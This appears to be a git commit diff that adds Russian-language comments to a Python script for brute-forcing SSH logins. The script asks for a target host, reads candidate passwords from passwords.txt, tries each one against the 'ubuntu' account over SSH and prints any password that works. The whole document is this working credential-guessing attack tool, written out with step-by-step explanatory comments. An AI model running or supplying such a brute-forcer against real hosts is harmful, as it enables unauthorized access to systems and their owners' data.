81ccfbd753ad5af1e537cd7799586ae7c798ba94
saschockk0 <113025483+saschockk0@users.noreply.github.com>
2024-04-15 23:19:08 +0300

    Update main.py

--- main.py
+++ main.py
@@ -5,20 +5,20 @@ host = input("Введите адрес цели\n")
 username = "ubuntu"
 attempts = 0
 
-with open("passwords.txt", "r") as passwords_list:
+with open("passwords.txt", "r") as passwords_list: #Открываем файл с паролями
     for password in passwords_list:
-        password = password.strip("\n")
+        password = password.strip("\n") #Разделяем пароли из файла
         try:
             print("[{}] Attempting password: '{}'!".format(attempts, password))
-            response = ssh(host=host, user=username, password=password, timeout=2)
+            response = ssh(host=host, user=username, password=password, timeout=2) #Пытаемся подключиться по ssh к хосту с помощью 1 из паролей
 
-            if response.connected():
+            if response.connected(): #Если получилось, выдаем в консоль подходящий пароль
                 print("[>] Valid password found: '{}'!".format(password))
                 response.close()
                 break
 
             response.close()
-        except paramiko.ssh_exception.AuthenticationException:
+        except paramiko.ssh_exception.AuthenticationException: #Если не получилось, выдаем в консоль ошибку и пробуем снова
             print("Invalid password!")
 
         attempts += 1
